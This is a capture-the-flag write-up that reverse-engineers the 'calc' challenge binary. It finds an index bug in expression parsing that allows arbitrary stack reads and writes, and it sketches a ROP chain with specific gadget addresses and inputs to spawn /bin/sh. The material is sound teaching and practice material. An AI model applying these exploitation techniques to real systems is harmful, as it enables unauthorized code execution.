# WRITEUP

```
***calc [150 pts]***

Have you ever use Microsoft calculator?
```

Not a great suggestion, maybe it refers to some vulnerability in the Microsoft calculator.

## Binary information

```
▶ rabin2 -I ./calc
arch     x86
baddr    0x8048000
binsz    742005
bintype  elf
bits     32
canary   true
class    ELF32
compiler GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
crypto   false
endian   little
havecode true
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
rpath    NONE
sanitiz  false
static   true
stripped false
subsys   linux
va       true
```

So the binary has the stack not executable and it uses the canaries to detect overflow.

```
▶ strace ./calc 
execve("./calc", ["./calc"], 0x7fffffffe930 /* 37 vars */) = 0
strace: [ Process PID=611647 runs in 32 bit mode. ]
uname({sysname="Linux", nodename="mcamp-VirtualBox", ...}) = 0
brk(NULL)                               = 0x80ef000
brk(0x80efd40)                          = 0x80efd40
set_thread_area({entry_number=-1, base_addr=0x80ef840, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
readlink("/proc/self/exe", "/home/mcamp/Desktop/CTFS/pwnable"..., 4096) = 53
brk(0x8110d40)                          = 0x8110d40
brk(0x8111000)                          = 0x8111000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
rt_sigaction(SIGALRM, {sa_handler=0x8049434, sa_mask=[ALRM], sa_flags=SA_RESTART}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
alarm(60)                               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x13), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7ff9000
write(1, "=== Welcome to SECPROG calculato"..., 38=== Welcome to SECPROG calculator ===
) = 38
read(0, lulz
"l", 1)                         = 1
read(0, "u", 1)                         = 1
read(0, "l", 1)                         = 1
read(0, "z", 1)                         = 1
read(0, "\n", 1)                        = 1
write(1, "Merry Christmas!\n", 17Merry Christmas!
)      = 17
exit_group(17)                          = ?
+++ exited with 17 +++
```

Nothing special in this trace, unfortunately the binary is static so it's not possible to run it under ltrace in order to check what happens before the `write()`.

## Search the vulnerability

```
                  |void main(void)
                  |{
    0x0804946a    |    sym.__bsd_signal(0xe, sym.timeout);
    0x08049476    |    sym.alarm(0x3c);
    0x08049482    |    sym.puts("=== Welcome to SECPROG calculator ===");
    0x0804948f    |    sym._IO_fflush(_obj.stdout);
    0x08049494    |    sym.calc();
    0x080494a0    |    sym.puts("Merry Christmas!");
    0x080494a6    |    return;
                  |}
```
So the first information is that an alarm is registered to ring after `0x3c` seconds.

The function `calc` is the real main, analyzing the which function `calc` uses.

```
                  |void sym.calc(void)
                  |{
                  |    int32_t iVar1;
                  |    int32_t in_GS_OFFSET;
                  |    int32_t var_5a0h; // result of the expression
                  |    int32_t var_59ch; // variable used as base address for the result, weird!
                  |    int32_t var_40ch; // ascii expression
                  |    int32_t var_ch;
                  |    
    0x08049382    |    var_ch = *(int32_t *)(in_GS_OFFSET + 0x14);
    0x080493bb    |    while( true ) {
    0x08049395    |        fcn.08048240(&var_40ch, 0x400); // zeroing var_40ch memory
    0x080493b4    |        iVar1 = sym.get_expr((int32_t)&var_40ch, 0x400);
    0x080493bb    |        if (iVar1 == 0) break;
    0x080493cc    |        sym.init_pool((int32_t)&var_5a0h); // zeroing 100*4 bytes
						   /* parse expression */
    0x080493ed    |        iVar1 = sym.parse_expr((int32_t)&var_40ch, (int32_t)&var_5a0h);
    0x080493f4    |        if (iVar1 != 0) {
							   /* here the result is printed out */
    0x08049411    |            sym.__printf(0x80bf804, (&var_59ch)[var_5a0h + -1]);
    0x0804941e    |            sym._IO_fflush(_obj.stdout);
                  |        }
                  |    }
    0x080493c8    |    if (var_ch == *(int32_t *)(in_GS_OFFSET + 0x14)) {
    0x08049433    |        return;
                  |    }
    0x0804942d    |    // WARNING: Subroutine does not return
    0x0804942d    |    sym.__stack_chk_fail();
                  |}
```

at the end this function does:

1. zeroing the ascii expression variable
2. get a new expression
3. zeroing the result variable
4. parse expression
5. printf the result

Ok first thing to notice here is the variable `var_59ch` that is used only to get the result, putting a breakpoint on `0x08049411` seems that this variable contains the `ebp` value.

Below the disassembly around the address `0x080493c8`

```
    0x080493f6     |         eax = var_5a0h;
    0x080493fc     |         eax--;
    0x080493ff     |         eax = *((ebp + eax*4 - 0x59c));
    0x08049406     |         *((esp + 4)) = eax;
    0x08049411     |         _printf (0x80bf804);
    0x08049416     |         eax = stdout;
    0x0804941e     |         _IO_fflush (eax);
                   |     } while (1);
```

Basically, using `var_5a0h` should be possible to read every where in the memory.

```
[0xf7ffdb49]> dcu sym.parse_expr
Continue until 0x0804902a using 1 bpsize
1+2
hit breakpoint at: 804902a
[0x0804902a]> afvn i var_84h
[0x0804902a]> afvn ascii_expr arg_8h
[0x0804902a]> afvt ascii_expr char\*
[0x0804902a]> afn bzero fcn.08048240
[0x0804902a]> afn strcmp fcn.080482a0
[0x0804902a]> afvn operand_ptr var_88h
[0x0804902a]> afvt operand_ptr chari\*
[0x08049378]> afvn operator var_70h
[0x08049378]> afvt operator char\*
```

After the previous renaming the parse_expr function decompiled with r2ghidra `pdgo @ sym.parse_expr` seems easier to read.

```
                  |undefined4 sym.parse_expr(char *ascii_expr, int32_t result)
                  |{
                  |    int32_t iVar1;
                  |    int32_t iVar2;
                  |    undefined4 uVar3;
                  |    char *pcVar4;
                  |    int32_t in_GS_OFFSET;
                  |    int32_t var_90h;
                  |    int32_t var_8ch;
                  |    char *operand_ptr;
                  |    int32_t i;
                  |    uint32_t var_80h;
                  |    undefined4 size;
                  |    undefined4 str;
                  |    undefined4 var_74h;
                  |    char *operator;
                  |    int32_t canary;
                  |    
    0x08049046    |    canary = *(int32_t *)(in_GS_OFFSET + 0x14);
    0x08049057    |    operand_ptr = ascii_expr;
    0x0804905d    |    var_80h = 0;
    0x0804906c    |    bzero(&operator, 100);
    0x08049077    |    i = 0;
                  |    do {
```

This function is called from sym.calc after that an expression is stored into ascii_expr using the function sym.get_expr.

```
    0x0804909b    |        if (9 < (int32_t)ascii_expr[i] - 0x30U) {
    0x080490b7    |            pcVar4 = ascii_expr + (i - (int32_t)operand_ptr);
    0x080490c7    |            iVar1 = sym.malloc(pcVar4 + 1);
    0x080490e6    |            sym.memcpy(iVar1, operand_ptr, pcVar4);
    0x080490f3    |            pcVar4[iVar1] = '\0';
    0x08049104    |            iVar2 = strcmp(iVar1, 0x80bf7a8);
    0x0804910b    |            if (iVar2 == 0) {
    0x08049114    |                sym.puts("prevent division by zero");
    0x08049121    |                sym._IO_fflush(_obj.stdout);
    0x08049126    |                uVar3 = 0;
    0x0804912b    |                goto code_r0x0804935f;
                  |            }
    0x08049136    |            iVar1 = sym.atoi(iVar1);
    0x08049142    |            if (0 < iVar1) {
    0x0804914a    |                iVar2 = *(int32_t *)result;
    0x08049155    |                *(int32_t *)result = iVar2 + 1;
    0x08049160    |                *(int32_t *)(result + 4 + iVar2 * 4) = iVar1;
                  |            }
    0x08049196    |            if ((ascii_expr[i] != '\0') && (9 < (int32_t)ascii_expr[i + 1] - 0x30U)) {
    0x080491c7    |                sym.puts("expression error!");
    0x080491d4    |                sym._IO_fflush(_obj.stdout);
    0x080491d9    |                uVar3 = 0;
    0x080491de    |                goto code_r0x0804935f;
                  |            }
    0x080491a7    |            operand_ptr = ascii_expr + i + 1;
```

Seems that the do while takes some action only if the ascii_expr[i] is not a digit, this makes sense since if the current character is not a digit means that the nth operand can be parsed. Indeed at `0x080490e6` it is copying into a malloced buffer the operand contained in: `operand_ptr[:i]` and of course the `operand_ptr`.

```
[0x08049378]> pxs @ 0x80bf7a8
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x080bf7a8  3000 7072 6576 656e 7420 6469 7669 7369  0.prevent divisi
```

Basically if the operand copied is equals to "0" an error is printed out and the loop breaks. This means that no 0 operand could be used in the expressions.

```
./calc
=== Welcome to SECPROG calculator ===
1+2 
3
1+0
prevent division by zero
0+1
prevent division by zero
1+2+3+0
prevent division by zero
```

After this check the atoi() is used to get the integer value of the operand stored in the malloced buffer.
If the operand is greater than 0 it is stored in result array at result[0] index.
So the first operand should be stored at result[1], the second at result[2] and so on and of course result[0] is incremented as well in order to avoid overwrite of the operands.

If the expression is similar to the following: `1+2+3+4` putting a bp on `0x08049160` when the second '+' is parsed result will contain already the result of `1+2`.
This makes sense, in this way each expression is parsed and when two operands are found they are put in result[1], result[2] than these operands are evaluated and the result is stored at result[1].

On the other side if the expression is similar to the following: `1+2*4`, since '*' has more prio respect to '+' it is required to store '4' at result[2] and so on.
At most as seen at `0x080493cc` the result variable could contain at most 0x100 integer. 

```
1+2+3
hit breakpoint at: 8049160
:> dc
hit breakpoint at: 8049160
:> pxw @ 0xffffd3c8
0xffffd3c8  0x00000002 0x00000001 0x00000000 0x00000000  ................
0xffffd3d8  0x00000000 0x00000000 0x00000000 0x00000000  ................
:> dc
hit breakpoint at: 8049160
:> afvd
type:signed int doesn't exist
arg ascii_expr = 
var var_8ch = 0xffffd31c = 4294956380
arg result = 0xffffd3b4 = 4294955976
:> !rax2 4294955976
0xffffd3c8
:> pxw @ 0xffffd3c8
0xffffd3c8  0x00000002 0x00000003 0x00000002 0x00000000  ................
0xffffd3d8  0x00000000 0x00000000 0x00000000 0x00000000  ................
```


Another check is shown in the previous snippet, basically if the character next to the operand is not a digit an error is thrown.

```
▶ ./calc
=== Welcome to SECPROG calculator ===
1+2+a
expression error!
1+2++
expression error!
```

```
    0x080491bc    |            if (*(char *)((int32_t)&operator + var_80h) == '\0') {
    0x080491fc    |                *(char *)((int32_t)&operator + var_80h) = ascii_expr[i];
                  |            } else {
    0x0804922a    |    // switch table (11 cases) at 0x80bf7d8
    0x0804922a    |                switch(ascii_expr[i]) {
                  |                case '%':
                  |                case '*':
                  |                case '/':
    0x08049288    |                    if ((*(char *)((int32_t)&operator + var_80h) == '+') ||
    0x08049283    |                       (*(char *)((int32_t)&operator + var_80h) == '-')) {
    0x080492a7    |                        *(char *)((int32_t)&operator + var_80h + 1) = ascii_expr[i];
    0x080492a9    |                        var_80h = var_80h + 1;
                  |                    } else {
    0x080492c6    |                        sym.eval(result, (int32_t)*(char *)((int32_t)&operator + var_80h));
    0x080492e4    |                        *(char *)((int32_t)&operator + var_80h) = ascii_expr[i];
                  |                    }
                  |                    break;
                  |                default:
    0x08049303    |                    sym.eval(result, (int32_t)*(char *)((int32_t)&operator + var_80h));
    0x08049308    |                    var_80h = var_80h - 1;
    0x08049308    |                    break;
                  |                case '+':
                  |                case '-':
    0x08049247    |                    sym.eval(result, (int32_t)*(char *)((int32_t)&operator + var_80h));
    0x08049265    |                    *(char *)((int32_t)&operator + var_80h) = ascii_expr[i];
                  |                }
                  |            }
```

So if the operator is NULL, means that the ascii_expr[i] is an operator, the operator stored in ascii_expr[i] is put in operator variable, var_80h in this case is 0.
Otherwise, the operator[var_80h] already contains a valid operator a switch case is executed.

In the switch case, if the operator in ascii_expr[i] is an higher priority operator and the already stored operator is '+' or '-', the current operatore is stored in the proper place and var_80h (that is used to count how many operatore are available in operator and how many operations should be evaluated. Indeed var_80h is used to store the operator also at: `0x080491fc`

`var_80h` should be used to execute before highest prio operations. If the current character is '+' or '-' the function eval to evaluate the already stored operator alongside the operands stored in result and the current character then is stored in operator[var_80h].

The default case is reached if and only if the operator is already stored and if the ascii_expr[i] == '\0'.


```
    0x0804931f    |            if (ascii_expr[i] == '\0') {
    0x08049358    |                while (-1 < (int32_t)var_80h) {
    0x0804934b    |                    sym.eval(result, (int32_t)*(char *)((int32_t)&operator + var_80h));
    0x08049350    |                    var_80h = var_80h - 1;
                  |                }
    0x0804935a    |                uVar3 = 1;
                  |code_r0x0804935f:
    0x08049369    |                if (canary != *(int32_t *)(in_GS_OFFSET + 0x14)) {
    0x0804936b    |    // WARNING: Subroutine does not return
    0x0804936b    |                    sym.__stack_chk_fail();
                  |                }
    0x08049378    |                return uVar3;
                  |            }
                  |        }
    0x08049324    |        i = i + 1;
    0x0804932b    |    } while( true );
                  |}
```

At the end if ascii_expr[i] is NULL, until var_80h the eval function is executed.

Nothing special to say on this function, a little bit weird, anyway there is a possibility to trigger an useless overflow on the result variable just using an expression like: `x+y*z+k*s...` result should be overflowed after 100 operands inserted, of course the overflow should happen on operator.
Indeed operator is 0x100 bytes long and can overflow with 0x100 operations.

Let's try this:

```
▶ python3 -c 'print("1" + "+2*3"*100)' | ./calc
=== Welcome to SECPROG calculator ===
**\* stack smashing detected ***: ./calc terminated
[1]    642089 done                 python3 -c 'print("1" + "+2*3"*100)' |
       642090 abort (core dumped)  ./calc

▶ python3 -c 'print("1" + "+2+3"*100)' | ./calc
=== Welcome to SECPROG calculator ===
501
```

Of course this vulnerabilities is not exploitable to get a command execution because of canaries.

So let's find another way.


```
[0xf7ffdb41]> db 0x08048eec
[0xf7ffdb41]> dc
1+2
hit breakpoint at: 8048eec
[0x08048eec]> afvn operator arg_ch
[0x08048eec]> avfn result arg_8h
[0x08048eec]> ds
[0x08048eef]> afvd
arg operator = 0xffffd1e4 = 43
var var_ch = 0xffffd1cc = 43
arg result = 0xffffd1e0 = 4294955688
[0x08048eef]> pxx 2 @ 0xffffd1e4
- offset -   0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF
0xffffd1e4  +.
```

Below the function `sym.eval`.

```
                  |void sym.eval(int32_t result, int32_t operator)
                  |{
                  |    char cVar1;
                  |    int32_t var_ch;
                  |
    0x08048eec    |    cVar1 = (char)operator;
    0x08048ef6    |    if (cVar1 == '+') {
    0x08048f45    |        \*(int32_t \*)(result + 4 + (\*(int32_t \*)result + -2) * 4) =
    0x08048f2d    |             *(int32_t *)(result + 4 + (*(int32_t *)result + -2) * 4) +
    0x08048f3c    |             *(int32_t *)(result + 4 + (*(int32_t *)result + -1) * 4);
                  |    } else {
    0x08048efb    |        if (cVar1 < ',') {
    0x08048f00    |            if (cVar1 == '*') {
    0x08048fab    |                *(int32_t *)(result + 4 + (*(int32_t *)result + -2) * 4) =
    0x08048f92    |                     *(int32_t *)(result + 4 + (*(int32_t *)result + -2) * 4) *
    0x08048fa1    |                     *(int32_t *)(result + 4 + (*(int32_t *)result + -1) * 4);
                  |            }
                  |        } else {
    0x08048f0a    |            if (cVar1 == '-') {
    0x08048f79    |                *(int32_t *)(result + 4 + (*(int32_t *)result + -2) * 4) =
    0x08048f61    |                     *(int32_t *)(result + 4 + (*(int32_t *)result + -2) * 4) -
    0x08048f70    |                     *(int32_t *)(result + 4 + (*(int32_t *)result + -1) * 4);
                  |            } else {
    0x08048f0f    |                if (cVar1 == '/') {
    0x08048fdf    |                    *(int32_t *)(result + 4 + (*(int32_t *)result + -2) * 4) =
    0x08048fc4    |                         *(int32_t *)(result + 4 + (*(int32_t *)result + -2) * 4) /
    0x08048fd3    |                         *(int32_t *)(result + 4 + (*(int32_t *)result + -1) * 4);
                  |                }
                  |            }
                  |        }
                  |    }
    0x08048fef    |    *(int32_t *)result = *(int32_t *)result + -1;
    0x08048ff7    |    return;
                  |}
```

Basically here the operation takes place in this way:

`result[1 + result[0] - 2] = result[1 + result[0] -2] <operator> result[1 + result[0] - 1];`

on the return this function decrements result[0].

Note that result[0] contains the number of the operands, and it is used as offset to get the right operands for the operation.
Note that `sym.eval()` is called by `sym.parse_expr()` n times for n operator in the ascii expression.
The last `sym.eval()` call will have result[0] = 2, result[1] = operands1 = result, result[2] = operands2.
So in `sym.calc()` the result printed out in the following way:

```
│   │││╎╎   0x080493f6      8b8560faffff   mov eax, dword [result]
│   │││╎╎   0x080493fc      83e801         sub eax, 1
│   │││╎╎   0x080493ff      8b848564faff.  mov eax, dword [ebp + eax\*4 - 0x59c]
│   │││╎╎   0x08049406      89442404       mov dword [var_4h], eax
│   │││╎╎   0x0804940a      c7042404f80b.  mov dword [esp], 0x80bf804  ; [0x80bf804:4]=0xa6425 "%d"
│   │││╎╎   0x08049411      e84a6b0000     call sym.__printf
```

Indeed result[0] is used as displacement to get result[1] this is weird, as shown at: `0x080493ff`!
Actaully in order to get result[1], it is required that result[0] = 0.

```
[0xf7ffdb49]> db 0x08049406
[0xf7ffdb49]> dc
2+4
hit breakpoint at: 8049406
[0x08049406]> afvd
var var_ch = 0xffffd83c = 426818816
var var_40ch = 0xffffd43c = 3418930
var var_5a0h = 0xffffd2a8 = 1
var var_59ch = 0xffffd2ac = 6
var vari_4h = 0x1ffffccd8 = -1
[0x08049406]> pxw @ 0xffffd2a8
0xffffd2a8  0x00000001 0x00000006 0x00000004 0x00000000  ................
0xffffd2b8  0x00000000 0x00000000 0x00000000 0x00000000  ................
[0x08049406]> dr
eax = 0x00000006
ebx = 0x080481b0
ecx = 0x00000006
edx = 0x00000003
esi = 0x00000000
edi = 0x080ec00c
esp = 0xffffd290
ebp = 0xffffd848
eip = 0x08049406
eflags = 0x00000246
oeax = 0xffffffff
[0x08049406]> !rax2 0xffffd848-0x59c
4294955692
[0x08049406]> rax2 4294955692
0xffffd2ac
[0x08049406]> pxw @ 0xffffd2ac
0xffffd2ac  0x00000006 0x00000004 0x00000000 0x00000000  ................
```

So if result[0] is != 1 after sym.parse_expr() a memory leak happens!
Note that result[0] is just used to store the number of the operands, e.g. 1+2 => result[0] = 2, 1+2\3 => result[0] = 3.
Moreover as seen previously if the expression contains more operations with the same prio,
e.g. 1+2+3 => result[0] at most will be 2.

But if an input like this: `+1` is inserted result[0] for sure should equals to 1.
This cause that in sym.eval() happens an arbitrary write in memory.

Indeed:
`result[1 + result[0] - 2] = result[1 + result[0] -2] <operator> result[1 + result[0] - 1];`
Became:
`result[0] = result[0] <operator> result[1]; // result[0] = 1 + 1`

And of course the printf will print the value at `ebp + 1*0x4 - 0x59c`.
Of course using a different operand, e.g. `+10` we are able to read at: `ebp + 10*0x40 -  0x59c`.

```
▶ ./calc                                       
=== Welcome to SECPROG calculator ===
+31337
[1]    642776 segmentation fault (core dumped)  ./calc
```

OK. This is a vulnerability, but just to read in the memory. Useful to get some addresses but nothing more.

In the function `sym.parse_expr()` there is an istruction that can allows an arbitrary memory write at: `0x08049160`.

`*(int32_t *)(result + 4 + iVar2 * 4) = iVar1;`

iVar1 is the atoi(operand_ascii), iVar2 = result[0].

```
[0xf7ffdb49]> db 0x08049160
[0xf7ffdb49]> db 0x08048f45
[0xf7ffdb49]> dc
+10
hit breakpoint at: 8049160
[0x08049160]> afvd
arg ascii_expr = 
var var_8ch = 0xffffd1fc = 4294956092
arg result = 0xffffd294 = 4294955688
var var_90h = 0xffffd1f8 = 4294955688
var canary = 0xffffd27c = 2210845952
var operand_ptr = 
var var_80h = 0xffffd208 = 0
var operator = 
var i = 0xffffd204 = 3
var size = 0xffffd20c = 2
var str = 0xffffd210 = 135202344
var var_74h = 
var s2 = 0x1ffffd138 = 0xffffffff
var n = 0x1ffffd13c = -1
[0x08049160]> pxw @ 0xffffd1f8
0xffffd1f8  0xffffd2a8 0xffffd43c 0xffffd43d 0x00000003  ....<...=.......
[0x08049160]> pxw @ 0xffffd2a8
0xffffd2a8  0x00000001 0x00000000 0x00000000 0x00000000  ................
[0x08049160]> ds
[0x08049164]> pxw @ 0xffffd2a8
0xffffd2a8  0x00000001 0x0000000a 0x00000000 0x00000000  ................
[0x08049164]> dc
hit breakpoint at: 8048f45
[0x08048f45]> pxw @ 0xffffd2a8
0xffffd2a8  0x00000001 0x0000000a 0x00000000 0x00000000  ................
[0x08048f45]> ds
[0x08048f49]> pxw @ 0xffffd2a8
0xffffd2a8  0x0000000b 0x0000000a 0x00000000 0x00000000  ................
```
`0xffffd2a8` is the result address.

From the previous debug session on the first bp, result[0] is 1 of course, this lead to write in result[1] = 10.
On the second bp the following line is executed:

`result[1 + result[0] - 2] = result[1 + result[0] -2] <operator> result[1 + result[0] - 1];`
Became:

```
result[0] = 1; // since the operations are at the same prio.
result[0] = result[0] +  result[1]; // result[0] = 1 + 10 == 11 //
result[0]-- == 1;
```

This was the debug session for an input like `+x`, but what happens if the input is `+x+y`?

When the `y` is parsed and translated to integer it will be stored in `result[x+1]` at line: `0x08049160`.
Below the debug session of this case:

```
+10+22
hit breakpoint at: 8049160
[0x08049160]> pxw @ 0xffffd2a8
0xffffd2a8  0x00000001 0x00000000 0x00000000 0x00000000  ................
[0x08049160]> ds
[0x08049164]> pxw @ 0xffffd2a8
0xffffd2a8  0x00000001 0x0000000a 0x00000000 0x00000000  ................
[0x08049164]> dc
hit breakpoint at: 8048f45
[0x08048f45]> pxw @ 0xffffd2a8
0xffffd2a8  0x00000001 0x0000000a 0x00000000 0x00000000  ................
[0x08048f45]> ds
[0x08048f49]> pxw @ 0xffffd2a8
0xffffd2a8  0x0000000b 0x0000000a 0x00000000 0x00000000  ................
// until here the +10 + 1 is copied into result[0], now result[0] is used as displacement to store 22!
// 22 will be stored at result[x+1]!

[0x08048f49]> dc
hit breakpoint at: 8049160
[0x08049160]> pxw @ 0xffffd2a8
0xffffd2a8  0x0000000b 0x0000000a 0x00000000 0x00000000  ................
[0x08049160]> ds
[0x08049164]> pxw @ 0xffffd2a8
0xffffd2a8  0x0000000b 0x0000000a 0x00000000 0x00000000  ................
0xffffd2b8  0x00000000 0x00000000 0x00000000 0x00000000  ................
0xffffd2c8  0x00000000 0x00000000 0x00000000 0x00000016  ................
// arbitrary write achieved!

[0x08049164]> dc
hit breakpoint at: 8048f45
[0x08048f45]> pxw @ 0xffffd2a8
0xffffd2a8  0x0000000b 0x0000000a 0x00000000 0x00000000  ................
0xffffd2b8  0x00000000 0x00000000 0x00000000 0x00000000  ................
0xffffd2c8  0x00000000 0x00000000 0x00000000 0x00000016  ................
[0x08048f45]> ds
[0x08048f49]> pxw @ 0xffffd2a8
0xffffd2a8  0x0000000b 0x0000000a 0x00000000 0x00000000  ................
0xffffd2b8  0x00000000 0x00000000 0x00000000 0x00000000  ................
0xffffd2c8  0x00000000 0x00000000 0x00000016 0x00000016  ................
// Another arbitrary write at result[x]!
```

So at the the vulnerabilities could be resumed:

1. Memory lead - input `+x` leads to leak memory at: result[x - 1] since result[0] is decremented by 1 before the print.
   `ebp + 0x59c = result`.
2. Arbitrary write - input `+x+y` leads to write `y` at `result[x+1], result[x]`.

So, since the stack is not executable a ROP chain is needed in order to exploit these vulnerabilities, of course a leak is required!

Of course, ROP gadgets addresses cannot be written in the result variable or in the ascii_expr variable since these are zeroed each loop in sym.calc.
Shold write these values somewhere else, for example in the stack forward in the unallocated area.

So first thing is to leak an address in .text section, the return address from `sym.calc()` was choosen.

```
ret_addr_from_sym_calc = 0xffffd84c // at ebp+4
ebp = 0xffffd848
var_print = *(ebp - 0x59c + result[0])
x = result[0]

ret_addr_from_sym_calc = var_print =>
ret_addr_from_sym_calc = ebp - 0x59c + x
x = ret_addr_from_sym_calc - ebp + 0x59c =>
x = 1440 => input should be 360 to read result[360-1] so the input at end should be 361.
```

With the previous leak it's possible to calculate the gadgets addresses.

Now before going deep in searching gadgets, it is required to get the address to trigger the ROP execution.

The idea is to overwrite the return address of the sym.calc function, it is located as previously seen at: ebp+4.

```
:> pxw @ ebp 
0xffffd848  0xffffd868 0x08049499 0x080ec200 0x08049434  h...........4...
```

So it's possible to read ebp to get `0xffffd868` address and then the return address is located at `0xffffd868 - 28`.

```
ret_addr_from_sym_calc = 0xffffd84c
leak_addr = 0xffffd848 = ebp
var_print = *(ebp - 0x59c + result[0])
x = result[0]

leak_addr = var_print
x = ebp - ebp + 0x59c => x = 359 => input should be 360.

ret_address_stored_at = output - 28
```

Now it's know how to trigger the exploit and how calculate the gadgets.

```
Trigger exploit
=== Welcome to SECPROG calculator ===
hit breakpoint at: 8049379
:> dc
+360+4276545
hit breakpoint at: 80493ff
:> dc
4266409
hit breakpoint at: 8049416
:> pxw @ ebp
0xffffd848  0x004119a9 0x00414141 0x080ec200 0x08049434  ..A.AAA.....4...
0xffffd858  0xffffd8fc 0x080481b0 0x00000000 0x080ec00c  ................
0xffffd868  0x08049c30 0x0804967a 0x00000001 0xffffd8f4  0...z...........
0xffffd878  0xffffd8fc 0x00000000 0x00000000 0x080481b0  ................
0xffffd888  0x00000000 0x080ec00c 0x08049c30 0x1e89c5b3  ........0.......
0xffffd898  0xe815545c 0x00000000 0x00000000 0x00000000  \T..............
0xffffd8a8  0x00000000 0x00000000 0x00000000 0x00000000  ................
0xffffd8b8  0x00000000 0x00000000 0x00000001 0x00000000  ................
0xffffd8c8  0x00000000 0x08048d4b 0x08049452 0x00000001  ....K...R.......
0xffffd8d8  0xffffd8f4 0x08049b90 0x08049c30 0x00000000  ........0.......
0xffffd8e8  0xffffd8ec 0x00000000 0x00000001 0xffffda8c  ................
0xffffd8f8  0x00000000 0xffffdac2 0xffffdad3 0xffffdade  ................
0xffffd908  0xffffdaec 0xffffdafd 0xffffdb9c 0xffffdbaf  ................
0xffffd918  0xffffdbc4 0xffffdbd7 0xffffdbf6 0xffffdc2c  ............,...
0xffffd928  0xffffdc41 0xffffdc58 0xffffdc67 0xffffdc7e  A...X...g...~...
0xffffd938  0xffffdc92 0xffffdcaa 0xffffdcbf 0xffffdcd3  ................
:> dc
ciao
hit breakpoint at: 8049432
:> dc
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00414141 code=1 ret=0
:> dr
eax = 0x00000000
ebx = 0x080481b0
ecx = 0xffffd27b
edx = 0x00000000
esi = 0x00000000
edi = 0x080ec00c
esp = 0xffffd850
ebp = 0x004119a9
eip = 0x00414141
eflags = 0x00010246
oeax = 0xffffffff
```

Gadgets can be placed in the stack at ebp address after the return value,
this is very convenient since the LEAVE instruction at the end of `sym.calc()` will put esp = ebp.
So it is not required ROP gadgets to achieve the stack pivoting.

```
var_where_write = 0xffffd8448 // +x
ebp = 0xffffd8448
var = *(ebp - 0x59c + result[0])
x = result[0]

var_where_write = var

x = var_where_write -ebp + 0x59c => x = 1440 => x = 360
```

Pay attention that the stack should be filled from highest address to the lowest otherwise our values will be overwritten, this is shown below.

```
[0x08048d2a]> dc
=== Welcome to SECPROG calculator ===
+361+4276545
138794458
hit breakpoint at: 8049416
[0x08049416]> pxw @ ebp
0xffffd848  0xffffd868 0x0845d5da 0x00414141 0x08049434  h.....E.AAA.4...
[0x08049416]> dc
+362+4276545
8553090
hit breakpoint at: 8049416
[0x08049416]> pxw @ ebp
0xffffd848  0xffffd868 0x0845d5da 0x00828282 0x00414141  h.....E.....AAA.
0xffffd858  0xffffd8fc 0x080481b0 0x00000000 0x080ec00c  ................
```


Let's search gadgets using [ROPGadget](https://github.com/JonathanSalwan/ROPgadget).

```
execv ("/bin/sh\0", argv = "/bin/sh\0", "\0\0\0\0")

eax = 11
ebx = "/bin/sh\0"
ecx = ebx
edx = NULL


----------------- Gadgets ------------------

0x080e398d  pop eax; ret
0x080701d0  pop edx; pop ecx; pop ebx; ret
0x08094cfb  int 0x80

--------------------------------------------

Stack should be filled in the following way:

0xffffd8448: 0x080e398d  0x11
0xffffd8450: 0x080701d0  addr_null
0xffffd8458: addr_binsh addr_binsh
0xffffd8460: 0x08094cfb
```

The string "/bin/sh\0\0\0\0\0" can be written in the bss at: 0x080ecfc0 using -1039941819 as index.
The memory at 0x080ecfc0 is never used and this makes it very convenient.

NOTE:
Since the binary is statically compiled, the ASLR will influence only the stack section and the heap.
So in the exploit can be used .text and .bss addresses without calculate their addresses since they are fixed.
